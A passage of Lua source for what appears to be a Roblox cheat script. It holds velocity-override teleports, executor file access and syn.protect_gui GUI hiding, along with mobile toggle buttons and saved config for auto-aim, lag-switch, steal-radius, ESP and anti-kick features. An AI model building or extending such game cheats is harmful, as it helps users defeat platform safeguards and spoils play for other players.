    M._lastDropTime = tick()

    M.dropActive = true
    local startTime = tick()
    local duration = tonumber(M.DROP_ASCEND_DURATION) or 0.2
    local ascend = tonumber(M.DROP_ASCEND_SPEED) or 150
    local dropConn
    dropConn = RunService.Heartbeat:Connect(function()
        local currentChar = player.Character
        local currentRoot = currentChar and currentChar:FindFirstChild("HumanoidRootPart")
        if not currentChar or not currentRoot then
            if dropConn then pcall(function() dropConn:Disconnect() end) end
            M.dropActive = false
            return
        end
        if tick() - startTime >= duration then
            if dropConn then pcall(function() dropConn:Disconnect() end) end
            local rayParams = RaycastParams.new()
            rayParams.FilterDescendantsInstances = {currentChar}
            rayParams.FilterType = Enum.RaycastFilterType.Exclude
            local rayResult = workspace:Raycast(currentRoot.Position, Vector3.new(0, -2000, 0), rayParams)
            if rayResult then
                local hum = currentChar:FindFirstChildOfClass("Humanoid")
                local offset = (hum and hum.HipHeight or 2) + (currentRoot.Size.Y / 2)
                currentRoot.CFrame = CFrame.new(currentRoot.Position.X, rayResult.Position.Y + offset, currentRoot.Position.Z)
            end
            pcall(function()
                currentRoot.AssemblyLinearVelocity = Vector3.zero
                currentRoot.AssemblyAngularVelocity = Vector3.zero
                currentRoot.Velocity = Vector3.zero
            end)
            M.dropActive = false
            return
        end
        
        local v = currentRoot.AssemblyLinearVelocity
        currentRoot.AssemblyLinearVelocity = Vector3.new(v.X, ascend, v.Z)
        pcall(function() currentRoot.Velocity = Vector3.new(v.X, ascend, v.Z) end)
    end)
end


function M.stopAutoTPForAction()
    if M.autoTPEnabled then
        M.stopAutoTP()
        pcall(function() if M.setAutoTPVisual then M.setAutoTPVisual(false) end end)
        pcall(function() if M.saveConfig then M.saveConfig() end end)
    end
end


local function setupDeathReset()
    
    M.autoResetOnDeath = false
    if M._deathResetConn then pcall(function() M._deathResetConn:Disconnect() end); M._deathResetConn = nil end
    if M._deathResetCharAdded then pcall(function() M._deathResetCharAdded:Disconnect() end); M._deathResetCharAdded = nil end
end

function M.startRemoveAcc()
    if M.removeAccEnabled then return end
    M.removeAccEnabled = true
    local function removeAccDo()
        if not M.removeAccEnabled then return end
        local char = player.Character
        if not char then return end
        for _,obj in ipairs(char:GetDescendants()) do
            if obj:IsA("Accessory") or obj:IsA("Hat") then
                if not M.removedAccessories[obj] then
                    M.removedAccessories[obj] = true
                    pcall(function() obj:Destroy() end)
                end
            end
        end
    end
    removeAccDo()
    M.removeAccConn = player.CharacterAdded:Connect(function()
        task.wait(0.5)
        if M.removeAccEnabled then removeAccDo() end
    end)
end

function M.stopRemoveAcc()
    M.removeAccEnabled = false
    if M.removeAccConn then
        M.removeAccConn:Disconnect()
        M.removeAccConn = nil
    end
    M.removedAccessories = {}
end




function M.destroyMobileButtons()
    if M.mobGuiRef then
        pcall(function() M.mobGuiRef:Destroy() end)
        M.mobGuiRef = nil
    end
    for _,n in ipairs({"MoveeMobileButtons"}) do
        local old = game:GetService("CoreGui"):FindFirstChild(n); if old then old:Destroy() end
        local pgui = player:FindFirstChild("PlayerGui"); if pgui then local o = pgui:FindFirstChild(n); if o then o:Destroy() end end
    end
    M.mobBtnRefs = {}
end

function M.loadBtnPositions()
    local data = nil
    if isfile and isfile(M.MOB_POS_FILE) then
        local ok, d = pcall(function() return HS:JSONDecode(readfile(M.MOB_POS_FILE)) end)
        if ok and type(d)=="table" then data = d end
    end
    if (not data or next(data) == nil) and type(M._btnPosCache) == "table" then
        data = M._btnPosCache
    end
    return data or {}
end

function M.saveBtnPositions()
    if not M.mobGuiRef then return end
    local out = {}
    for _,child in ipairs(M.mobGuiRef:GetChildren()) do
        if child:IsA("Frame") and child:GetAttribute("BtnKey") then
            local key = child:GetAttribute("BtnKey")
            out[key] = {x=child.Position.X.Offset, y=child.Position.Y.Offset}
        end
    end
    M._btnPosCache = out
    pcall(function()
        if writefile then writefile(M.MOB_POS_FILE, HS:JSONEncode(out)) end
    end)
    
    pcall(function()
        if type(saveCherryConfig) == "function" then saveCherryConfig() end
    end)
end

function M.resetMobilePositions()
    
    pcall(function()
        if type(delfile) == "function" then
            delfile(M.MOB_POS_FILE)
        elseif type(writefile) == "function" then
            writefile(M.MOB_POS_FILE, "{}")
        end
    end)
    pcall(function()
        if isfile and isfile(M.MOB_POS_FILE) and type(writefile) == "function" then
            writefile(M.MOB_POS_FILE, "{}")
        end
    end)
    M._forceDefaultMobPos = true
    M.buildMobileButtons()
    M._forceDefaultMobPos = false
    
    pcall(function()
        if not M.mobGuiRef then return end
        local out = {}
        for _, child in ipairs(M.mobGuiRef:GetChildren()) do
            if child:IsA("Frame") and child:GetAttribute("BtnKey") then
                local key = child:GetAttribute("BtnKey")
                local dx = child:GetAttribute("DefaultX")
                local dy = child:GetAttribute("DefaultY")
                if typeof(dx) == "number" and typeof(dy) == "number" then
                    child.Position = UDim2.new(0, dx, 0, dy)
                    out[key] = {x = dx, y = dy}
                end
            end
        end
        if writefile then
            writefile(M.MOB_POS_FILE, HS:JSONEncode(out))
        end
    end)
end

function M.buildMobileButtons()
    M.destroyMobileButtons()
    if not M.mobileButtonsEnabled then return end

    local savedPositions = M._forceDefaultMobPos and {} or M.loadBtnPositions()
    
    if (not savedPositions or next(savedPositions) == nil) and type(M._btnPosCache) == "table" then
        savedPositions = M._btnPosCache
    end
    local vp = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(800,600)

    local shape = tostring(M.mobileButtonShape or "Normal")
    if shape ~= "Circle" then shape = "Normal" end
    M.circleButtonsEnabled = (shape == "Circle") 

    
    local side = math.max(48, math.floor((tonumber(M.mobileButtonsSize) or 64) * (M.uiScale or 0.8) * 0.72))
    local BTN_H, BTN_W = side, side
    local CORNER_R = 16
    local CUBE_STYLE = false
    if shape == "Circle" then
        CORNER_R = math.floor(side / 2)
    end

    local mobGui = Instance.new("ScreenGui")
    mobGui.Name = "MoveeMobileButtons"
    mobGui.ResetOnSpawn = false
    mobGui.DisplayOrder = 15
    mobGui.IgnoreGuiInset = true
    pcall(function() if syn and syn.protect_gui then syn.protect_gui(mobGui) end end)
    if not pcall(function() mobGui.Parent = game:GetService("CoreGui") end) then
        mobGui.Parent = player:WaitForChild("PlayerGui")
    end
    M.mobGuiRef = mobGui

    
    local C_BORDER = Color3.fromRGB(55, 55, 55)
    local C_TEXT = Color3.fromRGB(255, 255, 255)
    local C_TEXT_SUB = Color3.fromRGB(170, 170, 170)
    local C_BTN_ON_TEXT = Color3.fromRGB(10, 10, 10)
    local accent = (M.Theme and M.Theme.Accent) or UI_ACCENT or M.UI_ACCENT or CHERRY_ACCENT or Color3.fromRGB(165, 75, 255)
    local isWhiteTheme = true 
    local BTN_OFF = Color3.fromRGB(25, 25, 25)
    local BTN_ON = Color3.fromRGB(255, 255, 255)
    local TXT_OFF = C_TEXT_SUB
    local TXT_ON = C_BTN_ON_TEXT
    local STROKE_OFF, STROKE_ON, STROKE_THICK = C_BORDER, C_TEXT, 1
    local IMG_TINT_OFF, IMG_TINT_ON = accent, accent

    local btnDefs = {
        {"drop", "DROP\nBRAINROT", false},
        {"autoLeft", "AUTO\nLEFT", true},
        {"autoRight", "AUTO\nRIGHT", true},
        {"autoBat", "AUTO\nBAT", true},
        {"tpDown", "TP\nDOWN", false},
        {"carrySpeed", "CARRY\nSPEED", true},
        {"lagger", "LAGGER\nMODE", true},
        {"laggerCarry", "LAGGER\nCARRY", true},
        {"bypass", "BAT\nTP", true},
    }
    
    
    if (M.speedUIMode or "Original") ~= "Original" then
        local filtered = {}
        for _, def in ipairs(btnDefs) do
            local k = def[1]
            if k ~= "carrySpeed" and k ~= "lagger" and k ~= "laggerCarry" then
                table.insert(filtered, def)
            end
        end
        btnDefs = filtered
    end

    local cols = 2
    local gap = 8
    local padding = 6
    local pairW = cols * BTN_W + (cols - 1) * gap
    local startX = vp.X - pairW - padding
    local startY = 18
    
    local dropH = math.floor(BTN_H * 0.92)
    local dropW = pairW
    local topBlockH = dropH + gap + BTN_H 
    local restIndex = 0

    for i, def in ipairs(btnDefs) do
        local key = def[1]
        local label = def[2]
        local isToggle = def[3]

        local thisW, thisH = BTN_W, BTN_H
        local defaultX, defaultY
        if key == "drop" then
            thisW, thisH = dropW, dropH
            defaultX = startX
            defaultY = startY
        elseif key == "autoLeft" then
            defaultX = startX
            defaultY = startY + dropH + gap
        elseif key == "autoRight" then
            defaultX = startX + BTN_W + gap
            defaultY = startY + dropH + gap
        else
            if key == "bypass" then
                thisW = math.floor(BTN_W * 1.85)
                thisH = math.floor(BTN_H * 0.92)
            end
            local row = math.floor(restIndex / cols)
            local col = restIndex % cols
            defaultX = startX + col * (BTN_W + gap)
            defaultY = startY + topBlockH + gap + row * (BTN_H + gap)
            restIndex = restIndex + 1
        end

        local saved = (not M._forceDefaultMobPos) and savedPositions[key] or nil
        local posX = (saved and type(saved.x) == "number") and saved.x or defaultX
        local posY = (saved and type(saved.y) == "number") and saved.y or defaultY
        local container = Instance.new("Frame")
        container.Name = "Btn_" .. key
        container.Size = UDim2.new(0, thisW, 0, thisH)
        container.Position = UDim2.new(0, posX, 0, posY)
        container:SetAttribute("DefaultX", defaultX)
        container:SetAttribute("DefaultY", defaultY)
        container:SetAttribute("BtnKey", key)
        container.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        container.BorderSizePixel = 0
        container.Active = true
        container.ZIndex = 50
        container.Parent = mobGui
        local contCorner = Instance.new("UICorner", container)
        contCorner.CornerRadius = (shape == "Circle") and UDim.new(1, 0) or UDim.new(0, CORNER_R)
        local contStroke = Instance.new("UIStroke", container)
        contStroke.Name = "ContStroke"
        contStroke.Color = C_BORDER
        contStroke.Thickness = 1.5
        contStroke.Transparency = 0.3
        local contGrad = Instance.new("UIGradient", container)
        contGrad.Color = ColorSequence.new(Color3.fromRGB(20, 20, 20), Color3.fromRGB(50, 50, 50))
        contGrad.Rotation = 90

        local btn = Instance.new("TextButton")
        btn.Name = "Inner"
        btn.Size = UDim2.new(1, 0, 1, 0)
        btn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        btn.BorderSizePixel = 0
        btn.Text = ""
        btn.AutoButtonColor = false
        btn.ZIndex = 52
        btn:SetAttribute("BtnKey", key)
        btn.Parent = container
        local btnCorner = Instance.new("UICorner", btn)
        btnCorner.CornerRadius = (shape == "Circle") and UDim.new(1, 0) or UDim.new(0, CORNER_R)
        local btnGrad = Instance.new("UIGradient", btn)
        btnGrad.Name = "BtnGrad"
        btnGrad.Color = ColorSequence.new(Color3.fromRGB(35, 35, 35), Color3.fromRGB(15, 15, 15))
        btnGrad.Rotation = 90
        local bgImg = nil
        do
            local mobBgId = tonumber(M.mobBtnBgId) or 0
            if mobBgId and mobBgId > 0 then
                bgImg = Instance.new("ImageLabel")
                bgImg.Name = "BtnBgImage"
                bgImg.BackgroundTransparency = 1
                bgImg.Image = "rbxassetid://" .. tostring(mobBgId)
                bgImg.ScaleType = Enum.ScaleType.Crop
                bgImg.Size = UDim2.fromScale(1, 1)
                bgImg.ZIndex = 53
                bgImg.ImageTransparency = 0.15
                bgImg.Parent = btn
                local bgc = Instance.new("UICorner", bgImg)
                bgc.CornerRadius = (shape == "Circle") and UDim.new(1, 0) or UDim.new(0, CORNER_R)
                btn.BackgroundTransparency = 0.55
            end
        end
        local stroke = Instance.new("UIStroke", btn)
        stroke.Name = "BtnStroke"
        stroke.Color = C_BORDER
        stroke.Thickness = 1
        stroke.Transparency = 0.5
        local lbl = Instance.new("TextLabel", btn)
        lbl.Name = "Lbl"
        lbl.Size = UDim2.new(1, 0, 1, 0)
        lbl.BackgroundTransparency = 1
        lbl.Text = label
        lbl.TextColor3 = C_TEXT_SUB
        lbl.Font = Enum.Font.GothamBlack
        lbl.TextSize = 10
        lbl.TextWrapped = true
        lbl.TextXAlignment = Enum.TextXAlignment.Center
        lbl.TextYAlignment = Enum.TextYAlignment.Center
        lbl.ZIndex = 56

        local isOn = false
        local function updateStyle(state)
            local hasImg = bgImg ~= nil
            if isOn then
                btnGrad.Color = ColorSequence.new(Color3.fromRGB(255, 255, 255), Color3.fromRGB(160, 160, 160))
                lbl.TextColor3 = C_BTN_ON_TEXT
                stroke.Color = C_TEXT
                stroke.Thickness = 2
                stroke.Transparency = 0
                contStroke.Color = C_TEXT
                contStroke.Transparency = 0
                if hasImg then
                    bgImg.ImageTransparency = 0.35
                    btn.BackgroundTransparency = 0.25
                end
            else
                if state == "hover" then
                    btnGrad.Color = ColorSequence.new(Color3.fromRGB(65, 65, 65), Color3.fromRGB(35, 35, 35))
                    lbl.TextColor3 = C_TEXT
                    stroke.Color = C_BORDER
                    stroke.Thickness = 1
                    stroke.Transparency = 0.2
                    contStroke.Color = C_BORDER
                    contStroke.Transparency = 0.1
                    if hasImg then bgImg.ImageTransparency = 0.08 end
                elseif state == "press" then
                    btnGrad.Color = ColorSequence.new(Color3.fromRGB(85, 85, 85), Color3.fromRGB(50, 50, 50))
                    lbl.TextColor3 = C_TEXT
                    stroke.Color = C_BORDER
                    stroke.Thickness = 1
                    stroke.Transparency = 0
                    contStroke.Color = C_BORDER
                    contStroke.Transparency = 0
                    if hasImg then bgImg.ImageTransparency = 0.2 end
                else
                    btnGrad.Color = ColorSequence.new(Color3.fromRGB(35, 35, 35), Color3.fromRGB(15, 15, 15))
                    lbl.TextColor3 = C_TEXT_SUB
                    stroke.Color = C_BORDER
                    stroke.Thickness = 1
                    stroke.Transparency = 0.5
                    contStroke.Color = C_BORDER
                    contStroke.Transparency = 0.3
                    if hasImg then
                        bgImg.ImageTransparency = 0.15
                        btn.BackgroundTransparency = 0.55
                    end
                end
            end
        end
        local function setOn(v)
            isOn = v and true or false
            updateStyle("idle")
        end

        M.mobBtnRefs[key] = setOn

        btn.MouseButton1Down:Connect(function() updateStyle("press") end)
        btn.MouseButton1Up:Connect(function() updateStyle("hover") end)
        btn.MouseEnter:Connect(function() updateStyle("hover") end)
        btn.MouseLeave:Connect(function() updateStyle("idle") end)

        
        local dragging = false
        local dragStart = nil
        local startPos = nil
        local moved = false
        local clickBlocked = false
        btn.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                clickBlocked = false
                moved = false
                if not M.uiLocked then
                    dragging = true
                    dragStart = input.Position
                    startPos = container.Position
                end
            end
        end)
        UIS.InputChanged:Connect(function(input)
            if M.uiLocked or not dragging or not dragStart then return end
            if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
                local delta = input.Position - dragStart
                if not moved and (math.abs(delta.X) + math.abs(delta.Y)) > 8 then
                    moved = true
                    clickBlocked = true
                end
                if moved then
                    container.Position = UDim2.new(0, startPos.X.Offset + delta.X, 0, startPos.Y.Offset + delta.Y)
                end
            end
        end)
        UIS.InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                if dragging and moved then
                    pcall(function() M.saveBtnPositions() end)
                end
                dragging = false
                dragStart = nil
                startPos = nil
            end
        end)

        btn.Activated:Connect(function()
            if clickBlocked then clickBlocked = false; return end
            if key == "drop" then
                M.runDrop()
            elseif key == "tpDown" then
                M.runTPFloor()
            elseif key == "autoLeft" then
                if M.autoBatEnabled then
                    M.stopBatAimbot()
                    if M.autoBatSetVisual then M.autoBatSetVisual(false) end
                    if M.mobBtnRefs.autoBat then M.mobBtnRefs.autoBat(false) end
                end
                if M.autoPlayEnabled then M.stopAutoPlay() end
                if M.autoRightEnabled then
                    M.stopAutoRight()
                    if M.autoRightSetVisual then M.autoRightSetVisual(false) end
                    if M.mobBtnRefs.autoRight then M.mobBtnRefs.autoRight(false) end
                end
                if M.autoLeftEnabled then
                    M.stopAutoLeft()
                else
                    M.startAutoLeft()
                end
                setOn(M.autoLeftEnabled)
                if M.autoLeftSetVisual then M.autoLeftSetVisual(M.autoLeftEnabled) end
                saveCherryConfig()
            elseif key == "autoRight" then
                if M.autoBatEnabled then
                    M.stopBatAimbot()
                    if M.autoBatSetVisual then M.autoBatSetVisual(false) end
                    if M.mobBtnRefs.autoBat then M.mobBtnRefs.autoBat(false) end
                end
                if M.autoPlayEnabled then M.stopAutoPlay() end
                if M.autoLeftEnabled then
                    M.stopAutoLeft()
                    if M.autoLeftSetVisual then M.autoLeftSetVisual(false) end
                    if M.mobBtnRefs.autoLeft then M.mobBtnRefs.autoLeft(false) end
                end
                if M.autoRightEnabled then
                    M.stopAutoRight()
                else
                    M.startAutoRight()
                end
                setOn(M.autoRightEnabled)
                if M.autoRightSetVisual then M.autoRightSetVisual(M.autoRightEnabled) end
                saveCherryConfig()
            elseif key == "autoBat" then
                if M.autoPlayEnabled or M.autoLeftEnabled or M.autoRightEnabled then
                    if M.autoPlayEnabled then M.stopAutoPlay() end
                    if M.autoLeftEnabled then M.stopAutoLeft() end
                    if M.autoRightEnabled then M.stopAutoRight() end
                    if M.mobBtnRefs.autoLeft then M.mobBtnRefs.autoLeft(false) end
                    if M.mobBtnRefs.autoRight then M.mobBtnRefs.autoRight(false) end
                end
                if not M.autoBatEnabled then
                    M.queueAutoBatStart()
                else
                    M.stopBatAimbot()
                end
                setOn(M.autoBatEnabled)
                if M.autoBatSetVisual then M.autoBatSetVisual(M.autoBatEnabled) end
                saveCherryConfig()
            elseif key == "lagger" then
                M.toggleLaggerMode()
                setOn(M.laggerModeEnabled)
                if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(M.carrySpeedActive) end
                if M.laggerModeBtn then
                    M.laggerModeBtn.Text = M.laggerModeEnabled and "Lag On" or "Lag Off"
                end
                saveCherryConfig()
            elseif key == "carrySpeed" then
                M.toggleCarryMode()
                setOn(M.carrySpeedActive)
                if M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(M.laggerModeEnabled) end
                if M.carryModeBtn then
                    M.carryModeBtn.Text = M.carrySpeedActive and "Carry On" or "Carry Off"
                end
                saveCherryConfig()
            elseif key == "bypass" then
                M.toggleBypassAimbot()
                setOn(M.bypassAimbotEnabled)
                if M.setBypassVisual then M.setBypassVisual(M.bypassAimbotEnabled) end
                saveCherryConfig()
            elseif key == "laggerCarry" then
                M.toggleLaggerCarry()
                setOn(M.laggerCarryActive)
                saveCherryConfig()
            end
        end)
    end

    if M.mobBtnRefs.autoLeft then M.mobBtnRefs.autoLeft(M.autoLeftEnabled) end
    if M.mobBtnRefs.autoRight then M.mobBtnRefs.autoRight(M.autoRightEnabled) end
    if M.mobBtnRefs.autoBat then M.mobBtnRefs.autoBat(M.autoBatEnabled) end
    if M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(M.laggerModeEnabled) end
    if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(M.carrySpeedActive) end
    if M.mobBtnRefs.bypass then M.mobBtnRefs.bypass(M.bypassAimbotEnabled) end
    if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(M.laggerCarryActive) end
end




local CHERRY_CONFIG_NAME = "CherryConfig.json"
local CherryConfig = { Theme="Red" }
local CHERRY_THEMES = {
    
    White    = { Accent=Color3.fromRGB(255,255,255), AccentDim=Color3.fromRGB(180,180,190), Bg=Color3.fromRGB(0,0,0),     Row=Color3.fromRGB(8,8,12) },
    Purple   = { Accent=Color3.fromRGB(165,75,255),  AccentDim=Color3.fromRGB(120,50,200),  Bg=Color3.fromRGB(8,4,14),    Row=Color3.fromRGB(16,10,24) },
    Red      = { Accent=Color3.fromRGB(225,45,55),   AccentDim=Color3.fromRGB(160,30,40),   Bg=Color3.fromRGB(8,2,4),     Row=Color3.fromRGB(20,8,11) },
    Green    = { Accent=Color3.fromRGB(46,200,120),  AccentDim=Color3.fromRGB(30,140,80),   Bg=Color3.fromRGB(4,12,8),    Row=Color3.fromRGB(10,22,14) },
    
    Default  = { Accent=Color3.fromRGB(255,255,255), AccentDim=Color3.fromRGB(180,180,190), Bg=Color3.fromRGB(0,0,0),     Row=Color3.fromRGB(8,8,12) },
    Blue     = { Accent=Color3.fromRGB(58,128,245),  AccentDim=Color3.fromRGB(40,90,180),   Bg=Color3.fromRGB(4,8,16),    Row=Color3.fromRGB(10,16,28) },
    Pink     = { Accent=Color3.fromRGB(255,105,180), AccentDim=Color3.fromRGB(200,80,140),  Bg=Color3.fromRGB(14,6,12),   Row=Color3.fromRGB(24,12,20) },
    Yellow   = { Accent=Color3.fromRGB(255,214,0),   AccentDim=Color3.fromRGB(200,170,0),   Bg=Color3.fromRGB(12,12,4),   Row=Color3.fromRGB(20,18,8) },
    Grey     = { Accent=Color3.fromRGB(180,180,185), AccentDim=Color3.fromRGB(120,120,125), Bg=Color3.fromRGB(10,10,12),  Row=Color3.fromRGB(18,18,20) },
    Forest   = { Accent=Color3.fromRGB(46,200,120),  AccentDim=Color3.fromRGB(30,140,80),   Bg=Color3.fromRGB(4,12,8),    Row=Color3.fromRGB(10,22,14) },
    Cyan     = { Accent=Color3.fromRGB(0,220,255),   AccentDim=Color3.fromRGB(0,160,190),   Bg=Color3.fromRGB(4,12,16),   Row=Color3.fromRGB(8,20,26) },
    Orange   = { Accent=Color3.fromRGB(255,140,40),  AccentDim=Color3.fromRGB(200,100,30),  Bg=Color3.fromRGB(14,8,4),    Row=Color3.fromRGB(24,14,8) },
}
M.COMBAT_COLOR_THEMES = {"Red", "White", "Purple", "Green"}
if M._savedTheme and CHERRY_THEMES[M._savedTheme] then
    CherryConfig.Theme = M._savedTheme
end
M.colorScheme = CherryConfig.Theme
M.DEFAULT_BG_ID = 78248012786524
M.DEFAULT_MOB_BTN_BG_ID = 92132591931954
M.customBgId = 78248012786524
M.customBgOpacity = 0.35
M.mobBtnBgId = 92132591931954
M.BG_IMAGE_IDS = {
    78248012786524, 
    79737099962715,
    71211662493854,
    15556272558,
    1471587689,
    14349182390,
    108236541541009,
    86526406500677,
    125028284461731,
    138241571198031,
}
M.MOB_BTN_IMAGE_IDS = {
    92132591931954, 
    15101684346,
    39396,
    109592813321691,
    83661129801187,
    94353803110527,
    109100201685955,
}


local function loadCherryConfig()
    if type(readfile)~="function" or type(isfile)~="function" then return end
    local ok,d = pcall(function()
        if not isfile(CHERRY_CONFIG_NAME) then return nil end
        return HS:JSONDecode(readfile(CHERRY_CONFIG_NAME))
    end)
    if ok and type(d)=="table" then
        local themeName = nil
        if type(d.Theme)=="string" and CHERRY_THEMES[d.Theme] then themeName = d.Theme end
        if type(d.colorScheme)=="string" and CHERRY_THEMES[d.colorScheme] then themeName = d.colorScheme end
        
        if themeName == "Default" then themeName = "Red"
        elseif themeName == "Forest" then themeName = "Green" end
        if themeName and CHERRY_THEMES[themeName] then
            CherryConfig.Theme = themeName
            M.colorScheme = themeName
            M._savedTheme = themeName
        end
        if type(d.normalSpeed)=="number" then M.NS=d.normalSpeed end
        if type(d.carrySpeed)=="number" then M.CS=d.carrySpeed end
        if type(d.laggerSpeed)=="number" then M.LAGGER_SPEED=d.laggerSpeed end
        if type(d.laggerCarrySpeed)=="number" then M.LAGGER_CARRY_SPEED=d.laggerCarrySpeed end
        if type(d.speedMethod)=="string" then
            for _,sm in ipairs(M.speedMethodList) do if sm==d.speedMethod then M.speedMethod=sm; break end end
        end
        if type(d.grabRadius)=="number" then M.Steal.StealRadius=d.grabRadius end
        if type(d.stealDuration)=="number" then M.Steal.StealDuration=d.stealDuration end
        if type(d.stealStopTime)=="number" then M.Steal.StopTime=d.stealStopTime end
        if type(d.stealMode)=="string" then
            if d.stealMode == "Semi" or d.stealMode == "Normal" or d.stealMode == "V1" or d.stealMode == "V2" or d.stealMode == "V3" then
                M.stealMode=d.stealMode
            end
        end
        if type(d.autoTPHeight)=="number" then M.autoTPHeight=d.autoTPHeight end
        if type(d.fovValue)=="number" then M.fovValue=d.fovValue end
        if type(d.uiScale)=="number" then M.uiScale=d.uiScale end
        M.infJumpMode="hold" 
        if type(d.mobileButtonsSize)=="number" then M.mobileButtonsSize=d.mobileButtonsSize end
        if type(d.skyTheme)=="string" then M.currentSkyTheme=d.skyTheme end
        if type(d.stealBarSize)=="number" then M.stealBarSize=d.stealBarSize end
        
        if M.stealBarSize == 480 or M.stealBarSize == 520 then M.stealBarSize = 360 end
        if d.carrySpeedActive~=nil then M.carrySpeedActive=d.carrySpeedActive end
        if d.laggerModeEnabled~=nil then M.laggerModeEnabled=d.laggerModeEnabled end
        if d.speedBoosterEnabled~=nil then M.speedBoosterEnabled=d.speedBoosterEnabled==true end
        if type(d.speedBoosterPath)=="string" and (d.speedBoosterPath=="Normal" or d.speedBoosterPath=="Lagger") then M.speedBoosterPath=d.speedBoosterPath end
        if d.speedBoosterPanelOpen~=nil then M.speedBoosterPanelOpen=d.speedBoosterPanelOpen~=false end
        if type(d.speedBoosterPos)=="table" then M.speedBoosterPos=d.speedBoosterPos end
        if type(d.speedUIMode)=="string" and (d.speedUIMode=="Customizer" or d.speedUIMode=="Original") then M.speedUIMode=d.speedUIMode end
        if (M.speedUIMode or "Original") ~= "Original" then
            M.autoSwitchSpeedEnabled=false; M.autoTurnOffSpeedEnabled=false; M.autoSwitchLaggerSpeedEnabled=false
        end
        if d.autoSwing~=nil then M.autoSwingEnabled=d.autoSwing==true end
        if type(d.aimbotSpeed)=="number" then M.aimbotSpeed=d.aimbotSpeed end
        if d.introSoundEnabled~=nil then M.introSoundEnabled=d.introSoundEnabled==true end
                if d.introGUIEnabled~=nil then M.introGUIEnabled=d.introGUIEnabled==true end
        if d.ragdollGui~=nil then M.ragdollGuiEnabled=d.ragdollGui==true end
        if type(d.mobileButtonShape)=="string" and (d.mobileButtonShape=="Normal" or d.mobileButtonShape=="Circle") then
            M.mobileButtonShape = (d.mobileButtonShape == "Cube") and "Normal" or d.mobileButtonShape
            M.circleButtonsEnabled = (M.mobileButtonShape == "Circle")
        elseif d.circleButtonsEnabled~=nil then
            M.circleButtonsEnabled = d.circleButtonsEnabled==true
            M.mobileButtonShape = M.circleButtonsEnabled and "Circle" or "Normal"
        end
        if d.perButtonDrag~=nil then M.perButtonDragEnabled=d.perButtonDrag==true end
        if d.mobileButtonsEnabled~=nil then M.mobileButtonsEnabled=d.mobileButtonsEnabled end
        M.medusaResetEnabled = false 
        if type(d.medusaResetDelay)=="number" then M.medusaResetDelay=d.medusaResetDelay end
        if d.autoMoveSwing~=nil then M.autoMoveSwingEnabled=d.autoMoveSwing==true end
        if d.autoSwitchSpeed~=nil then M.autoSwitchSpeedEnabled=d.autoSwitchSpeed==true end
        if d.autoCarryEnemyBase~=nil then M.autoCarryEnemyBaseEnabled=d.autoCarryEnemyBase==true end
        if type(d.autoCarryEnemyBaseRange)=="number" then M.autoCarryEnemyBaseRange=d.autoCarryEnemyBaseRange end
        if d.autoTurnOffSpeed~=nil then M.autoTurnOffSpeedEnabled=d.autoTurnOffSpeed==true end
        if d.autoSwitchLaggerSpeed~=nil then M.autoSwitchLaggerSpeedEnabled=d.autoSwitchLaggerSpeed==true end
        if type(d.customFont)=="string" then M.customFontSelected=d.customFont end
        if d.showPlayerSpeeds~=nil then M.showPlayerSpeeds=d.showPlayerSpeeds==true end
        if d.removeAcc~=nil then M.removeAccEnabled=d.removeAcc end
        if d.playerESPEnabled~=nil then M.playerESPEnabled=d.playerESPEnabled end
        if d.antiRagdoll~=nil then M.antiRagdollEnabled=d.antiRagdoll end
        if type(d.antiRagdollMode)=="string" and (d.antiRagdollMode=="Splatter" or d.antiRagdollMode=="No Splatter") then M.antiRagdollMode=d.antiRagdollMode end
        if d.ragdollTPBase~=nil then M.ragdollTPBaseEnabled=d.ragdollTPBase==true end
        if type(d.ragdollTPBaseRange)=="number" then M.ragdollTPBaseRange=d.ragdollTPBaseRange end
        if d.autoStealEnabled~=nil then M.Steal.AutoStealEnabled=d.autoStealEnabled end
        if d.autoRadiusEnabled~=nil then M.autoRadiusEnabled=d.autoRadiusEnabled==true end

        if d.infiniteJump~=nil then M.infJumpEnabled=d.infiniteJump end
        if d.medusaCounter~=nil then M.medusaCounterEnabled=d.medusaCounter end
        if d.batCounter~=nil then M.batCounterEnabled=d.batCounter end
        M.unwalkEnabled=false; M.medusaResetEnabled=false; M.autoResetOnDeath=false 
        if d.antiLag~=nil then M.antiLagEnabled=d.antiLag end
        if d.nukeOptEnabled~=nil then M.nukeOptEnabled=d.nukeOptEnabled==true end
        if d.antiSummerBase~=nil then M.antiSummerBaseEnabled=d.antiSummerBase end
        if d.uiLocked~=nil then M.uiLocked=d.uiLocked==true end
        if d.stretchRez~=nil then M.stretchRezEnabled=d.stretchRez end
        if d.autoTPEnabled~=nil then M.autoTPEnabled=d.autoTPEnabled end
        if d.antiKick~=nil then M.antiKickEnabled=d.antiKick end
        if d.antiDie~=nil then M.antiDieEnabled = (d.antiDie ~= false) else M.antiDieEnabled = true end
        if d.antiFling~=nil then M.antiFlingEnabled=d.antiFling~=false end
        if d.safeMode~=nil then M.safeModeEnabled=d.safeMode end
        if d.mirrorTPDown ~= nil then M.mirrorTPDownEnabled = d.mirrorTPDown == true else M.mirrorTPDownEnabled = false end
        
        M.customBgId = M.DEFAULT_BG_ID or 78248012786524
        
        
        do
            local oldDefault = 127281366474870
            local forced = M.DEFAULT_BG_ID or 78248012786524
            local loaded = nil
            if type(d.customBgId)=="number" then loaded = d.customBgId
            elseif type(d.customBgId)=="string" and tonumber(d.customBgId) then loaded = tonumber(d.customBgId) end
            if loaded and loaded ~= oldDefault and loaded ~= forced then
                M.customBgId = loaded
            else
                M.customBgId = forced
            end
        end
        if type(d.customBgOpacity)=="number" then M.customBgOpacity=math.clamp(d.customBgOpacity,0,1) end
        if type(d.mobBtnBgId)=="number" then
            M.mobBtnBgId = d.mobBtnBgId
        elseif type(d.mobBtnBgId)=="string" and tonumber(d.mobBtnBgId) then
